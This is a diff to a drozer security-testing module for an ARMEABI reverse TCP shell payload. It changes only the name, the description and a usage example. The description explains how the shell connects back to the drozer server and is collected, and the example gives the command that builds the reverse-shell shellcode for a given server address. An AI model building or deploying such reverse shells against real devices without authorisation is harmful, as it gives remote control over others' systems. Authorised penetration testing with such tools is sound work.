@@ -2,11 +2,20 @@ from drozer.modules import common, Module
 
 class ARMEABI(Module, common.ShellCode):
 
-    name = "Reverse TCP Shell (ARMEABI)"
+    name = "Establish a reverse TCP Shell (ARMEABI)"
     description = """
-    Shell code to establish a simple reverse TCP shell.
+    Establish a reverse TCP Shell through the drozer Server.
+    
+    This module connects to the drozer Server, and sends 0x53 (S) to identify
+    itself as a bind shell.
+    
+    You can collect the shell by connecting to the server and sending 'COLLECT'
+    as the first line.
     """
-    examples = ""
+    examples = """
+    $ drozer shellcode build shell.reverse_tcp.armeabi  --server 10.0.2.2:31420
+                                                        --format U
+    """
     author = "Tyrone (@mwrlabs)"
     date = "2013-06-18"
     license = "BSD (3 clause)"
